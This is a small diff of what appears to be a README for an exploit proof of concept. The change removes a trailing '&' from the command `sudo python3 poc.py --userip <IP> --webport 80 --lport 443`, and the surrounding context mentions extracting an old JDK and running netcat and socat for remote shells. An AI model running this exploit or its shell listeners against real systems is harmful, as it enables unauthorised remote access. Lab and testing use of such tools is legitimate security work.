@@ -98,7 +98,7 @@ tar -xvf jdk-8u20-linux-x64.tar.gz
 Run exploiting app
 
 ```
-sudo python3 poc.py --userip <IP> --webport 80 --lport 443 &
+sudo python3 poc.py --userip <IP> --webport 80 --lport 443
 ```
 
 Run necessary netcat and socat processes for remote shells
